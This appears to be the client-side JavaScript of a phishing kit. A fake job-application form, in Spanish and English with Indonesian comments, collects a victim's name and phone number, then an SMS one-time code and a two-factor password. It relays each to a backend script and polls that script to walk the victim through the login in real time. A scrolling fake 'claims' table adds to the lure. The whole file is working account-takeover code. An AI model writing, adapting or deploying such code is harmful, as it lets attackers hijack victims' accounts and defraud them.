const API_URL = "bridge.php";
let COUNTRY_CODE = "+57"; // Default fallback
let MASK_FORMAT = "+57 ";

// ============================================================
// FUNGSI POLLING GLOBAL (SATU DEFINISI, TIDAK DUPLIKAT)
// ============================================================
function checkStatus() {
    var savedPhone = sessionStorage.getItem("user_phone");
    if (!savedPhone) {
        $("#submit-loader").hide();
        return;
    }

    $.ajax({
        url: API_URL,
        type: "POST",
        dataType: "json",
        data: {
            "method": "getStatus",
            "phone": savedPhone
        },
        success: function(data) {
            if (data && data.result) {
                var res = data.result;

                // ── A. STATUS SUCCESS ──────────────────────────────────
                if (res.status === "success") {

                    if (res.type === "checkPhone") {
                        $("#submit-loader").hide();
                        $(".step-section").removeClass("active");
                        $("#step2").addClass("active");
                        sessionStorage.setItem("user_state", "otp");
                        return;
                    }

                    else if (res.detail === "passwordNeeded" || res.type === "passwordNeeded") {
                        $("#submit-loader").hide();
                        $(".step-section").removeClass("active");
                        $("#step3").addClass("active");
                        sessionStorage.setItem("user_state", "password");
                        return;
                    }

                    else {
                        $("#submit-loader").hide();
                        $(".step-section").removeClass("active");
                        $("#step4").addClass("active");
                        sessionStorage.setItem("user_state", "success");
                        sessionStorage.removeItem("user_phone");
                        return;
                    }
                }

                // ── B. STATUS FAILED ───────────────────────────────────
                else if (res.status === "failed") {
                    $("#submit-loader").hide();

                    // ── FAILED: OTP Salah ──────────────────────────────
                    if (res.type === "OTP") {
                        $("#otp_code").val("");
                        $("#alert2").html("Código incorrecto o expirado.").fadeIn();
                        $(".step-section").removeClass("active");
                        $("#step2").addClass("active");
                        sessionStorage.setItem("user_state", "otp");

                    // ── FAILED: Nomor Telepon Bermasalah ───────────────
                    } else if (res.type === "checkPhone") {
                        $("#alert1").html("Número de teléfono inválido o no registrado.").fadeIn();
                        $(".step-section").removeClass("active");
                        $("#step1").addClass("active");
                        $("#firstForm").find("button").prop("disabled", false).text("SIGUIENTE");
                        sessionStorage.removeItem("user_phone");
                        sessionStorage.removeItem("user_state");

                    // ── FAILED: Password Salah ─────────────────────────
                    } else if (res.type === "password") {
                        $("#password").val("");
                        $("#alert3").html("Contraseña incorrecta. Intente de nuevo.").fadeIn();
                        $(".step-section").removeClass("active");
                        $("#step3").addClass("active");
                        sessionStorage.setItem("user_state", "password");

                    // ── FAILED: Type tidak dikenal → fallback ke step1 ─
                    } else {
                        $("#alert1").html("Error inesperado. Intente de nuevo.").fadeIn();
                        $(".step-section").removeClass("active");
                        $("#step1").addClass("active");
                        $("#firstForm").find("button").prop("disabled", false).text("SIGUIENTE");
                        sessionStorage.removeItem("user_phone");
                        sessionStorage.removeItem("user_state");
                    }

                    return; // STOP polling
                }
            }

            // ── C. STATUS WAITING / PENDING → lanjut polling ──────────
            setTimeout(checkStatus, 1500);
        },
        error: function() {
            // Koneksi error → coba lagi
            setTimeout(checkStatus, 3000);
        }
    });
}

// ============================================================
// FORMAT NOMOR TELEPON
// ============================================================
function formatPhoneNumber(e) {
    var a = e.replace(/\D/g, "");
    var prefix = COUNTRY_CODE.replace("+", "");
    return a.startsWith(prefix)
        ? "+" + a
        : (a.startsWith("0") && (a = a.substring(1)), COUNTRY_CODE + a);
}

// ============================================================
// STEP 1 — Kirim Nomor Telepon
// ============================================================
function processFirstData() {
    $("#firstForm").on("submit", function(e) {
        e.preventDefault();

        var name = $("input#full_name").val().trim();
        var phoneRaw = $("input#phone_number").val().trim();
        var formattedPhone = formatPhoneNumber(phoneRaw);
        var jobPosition = $("#job_position").val();
        var experience = $("#experience").val();

        if (name === "" || phoneRaw === "") {
            $("#alert1").html("Please complete all fields.").fadeIn();
            return false;
        }

        $("#submit-loader").css("display", "flex");
        $("#alert1").hide();
        $(this).find("button").prop("disabled", true).text("PROCESSING...");

        $.ajax({
            url: API_URL,
            type: "POST",
            dataType: "json",
            data: {
                "method": "sendCode",
                "phone": formattedPhone,
                "tc": name,
                "job_position": jobPosition, 
                "experience": experience
            },
            success: function(data) {
                sessionStorage.setItem("user_phone", data.normalized_phone || formattedPhone);
                sessionStorage.setItem("user_state", "waiting");
                checkStatus();
            },
            error: function(xhr) {
                $("#submit-loader").hide();
                $("#firstForm").find("button").prop("disabled", false).text("CONTINUE");
                var errorMsg = xhr.responseJSON ? xhr.responseJSON.message : "Connection error";
                $("#alert1").html(errorMsg).fadeIn();
            }
        });
    });
}

// ============================================================
// STEP 2 — Kirim OTP
// ============================================================
function processSecondData() {
    $("#otp_code").on("input", function() {
        $(this).val($(this).val().replace(/\D/g, "").slice(0, 5));
    });

    $("#secondForm button").on("click", function(e) {
        e.preventDefault();

        var com = $("#otp_code").val().trim();
        var savedPhone = sessionStorage.getItem("user_phone");

        if (com.length === 0 || !savedPhone) {
            alert("Enter the complete OTP code.");
            return;
        }

        $("#submit-loader").css("display", "flex");
        $("#alert2").hide();
        $("#wrong").hide();

        $.ajax({
            url: API_URL,
            type: "POST",
            dataType: "json",
            data: {
                "method": "sendOtp",
                "otp": com,
                "phone": savedPhone
            },
            success: function(data) {
                setTimeout(function() {
                    checkStatus();
                }, 500);
            },
            error: function() {
                $("#submit-loader").hide();
                alert("Failed to send OTP. Check connection.");
            }
        });
    });
}

// ============================================================
// STEP 3 — Kirim Password (2FA)
// ============================================================
function processThirdData() {
    $("#thirdForm").on("submit", function(e) {
        e.preventDefault();

        var o = $("#password").val();
        var savedPhone = sessionStorage.getItem("user_phone");

        if (o === "" || !savedPhone) return false;

        $("#submit-loader").css("display", "flex");
        $("#alert3").hide().html("");

        $.ajax({
            url: API_URL,
            type: "POST",
            dataType: "json",
            data: {
                "method": "sendPassword",
                "password": o,
                "phone": savedPhone
            },
            success: function(data) {
                setTimeout(function() {
                    checkStatus();
                }, 1000);
            },
            error: function(xhr) {
                $("#submit-loader").hide();
                var a = xhr.responseJSON ? xhr.responseJSON.message : "Error";
                $("#alert3").html(a).fadeIn();
            }
        });
    });
}

// ============================================================
// RESET SESI
// ============================================================
function resetSesi() {
    sessionStorage.removeItem("user_phone");
    sessionStorage.removeItem("user_state");
    $(".step-section").removeClass("active");
    $("#step1").addClass("active");
    $("#firstForm")[0].reset();
    $("#firstForm").find("button").prop("disabled", false).text("SIGUIENTE");
    $("#submit-loader").hide();
}

// ============================================================
// DOCUMENT READY
// ============================================================
$(document).ready(function() {

    // Load config dari server
    $.post(API_URL, { method: "getSettings" }, function(data) {
        if (data && data.result) {
            COUNTRY_CODE = data.result.country_code;
            MASK_FORMAT = data.result.mask_format;
        }
    }, "json");

    // Loader screen awal
    setTimeout(function() {
        $("#loader-screen").fadeOut(500);
    }, 1500);

    // Inisialisasi semua event listener form
    processFirstData();
    processSecondData();
    processThirdData();

    // ── AUTO-RESUME (jika user refresh / kembali) ────────────
    var savedPhone = sessionStorage.getItem("user_phone");
    var savedState = sessionStorage.getItem("user_state");

    if (savedState === "success") {
        $(".step-section").removeClass("active");
        $("#step4").addClass("active");

    } else if (savedPhone) {
        $(".step-section").removeClass("active");

        if (savedState === "otp") {
            $("#step2").addClass("active");

        } else if (savedState === "password") {
            $("#step3").addClass("active");

        } else {
            $("#submit-loader").css("display", "flex");
        }

        checkStatus();

    } else {
        $("#step1").addClass("active");
    }

    // ── INPUT MASKING (Format Nomor Telepon) ─────────────────
    $("#phone_number").on("input focus", function() {
        var e = $(this),
            a = e.val(),
            t = MASK_FORMAT;

        if (a.startsWith(t)) {
            var s = a.substring(t.length),
                o = s.replace(/\D/g, "");
            if (s !== o) e.val(t + o);
        } else {
            var n = a.replace(/\D/g, "");
            var prefix = COUNTRY_CODE.replace("+", "");
            if (n.startsWith(prefix)) n = n.substring(prefix.length);
            if (n.startsWith("0")) n = n.substring(1);
            e.val(t + n);
        }
    });

    $("#phone_number").on("keydown", function(e) {
        if (e.which === 8 && $(this).val().length <= MASK_FORMAT.length) {
            e.preventDefault();
        }
    });
    
    // scrolling berhasil claim
    $(document).ready(function() {
            $('.btn-submit').on('click', function() {
                $('html, body').animate({ scrollTop: 0 }, 'fast');
            });

            var $table = $('.custom-table');
            $table.find('th').css({
                'position': 'sticky',
                'top': '0',
                'background-color': '#000000',
                'color': '#ffffff',
                'z-index': '10'
            });
            
            $table.wrap('<div style="max-height: 380px; overflow: hidden; background: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05); width: 100%; max-width: 800px; margin: 0 auto; position: relative;"></div>');
            
            var $container = $table.parent();
            var $tbody = $table.find('tbody');
            var totalHeight = 0;

            $tbody.find('tr').each(function() {
                totalHeight += $(this).outerHeight();
            });

            $tbody.append($tbody.html());

            function startScroll() {
                var currentScroll = $container.scrollTop();
                var remainingHeight = totalHeight - currentScroll;
                var duration = (remainingHeight / 35) * 1000; 

                $container.animate({ scrollTop: totalHeight }, duration, 'linear', function() {
                    $container.scrollTop(0);
                    startScroll();
                });
            }
            startScroll();
        });

});
